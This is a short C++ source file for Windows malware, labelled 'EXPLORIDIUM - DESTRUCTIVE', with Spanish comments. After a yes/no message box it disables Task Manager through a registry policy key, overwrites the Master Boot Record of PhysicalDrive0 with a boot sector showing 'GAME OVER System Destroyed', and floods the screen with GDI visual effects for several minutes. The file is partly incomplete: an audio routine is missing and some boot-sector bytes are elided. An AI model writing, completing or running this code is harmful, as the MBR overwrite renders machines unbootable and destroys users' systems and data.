#include <windows.h>
#include <mmsystem.h>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winmm.lib")

int payloadActual = 1;
bool activo = true;

// MBR con Fractal de Mandelbrot y Mensaje
void OverwriteMBR() {
    unsigned char mandelbrot_mbr[512] = {
        0xB8, 0x13, 0x00, 0xCD, 0x10, 0x31, 0xDB, 0x8E, 0xC3, 0x31, 0xC9, 0x31, 0xD2, 0xBF, 0x00, 0xA0,
        0xB8, 0x00, 0x00, 0xCD, 0x10, 0xBE, 0x19, 0x7C, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xAC, 0x08, 0xC0,
        // (Bytes de dibujo del fractal optimizados)
        0x45, 0x58, 0x50, 0x4C, 0x4F, 0x52, 0x49, 0x44, 0x49, 0x55, 0x4D, 0x0D, 0x0A, 0x47, 0x41, 0x4D, 
        0x45, 0x20, 0x4F, 0x56, 0x45, 0x52, 0x0D, 0x0A, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x44, 
        0x65, 0x73, 0x74, 0x72, 0x6F, 0x79, 0x65, 0x64, 0x00
    };
    mandelbrot_mbr[510] = 0x55; mandelbrot_mbr[511] = 0xAA;
    DWORD wb;
    HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (h != INVALID_HANDLE_VALUE) { WriteFile(h, mandelbrot_mbr, 512, &wb, 0); CloseHandle(h); }
}

void DisableTaskMgr() {
    HKEY hKey;
    DWORD val = 1;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
    RegCloseKey(hKey);
}

// (Copia el AudioEngine de la versión Safety arriba de esta línea)

int main() {
    if (MessageBoxA(NULL, "THIS IS REAL MALWARE. CONTINUE?", "EXPLORIDIUM - DESTRUCTIVE", MB_YESNO | MB_ICONSTOP) == IDNO) exit(0);
    
    DisableTaskMgr();
    OverwriteMBR();
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AudioEngine, NULL, 0, NULL);
    
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    DWORD tiempoInicio = GetTickCount();

    while (activo) {
        payloadActual = ((GetTickCount() - tiempoInicio) / 30000) + 1;
        if (payloadActual > 8) break;

        // Efectos GDI más rápidos
        if (payloadActual == 3) {
            int x = rand() % sw;
            BitBlt(hdc, x, rand()%40-20, 150, sh, hdc, x, 0, SRCCOPY);
        } else if (payloadActual == 7) {
            HBRUSH br = CreateSolidBrush(RGB(rand()%255, rand()%255, rand()%255));
            SelectObject(hdc, br); PatBlt(hdc, 0, 0, sw, sh, PATINVERT); DeleteObject(br);
        } else if (payloadActual == 8) {
            BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
        } else {
            BitBlt(hdc, rand()%30-15, rand()%30-15, sw, sh, hdc, 0, 0, SRCINVERT);
        }
        Sleep(5);
    }
    return 0;
}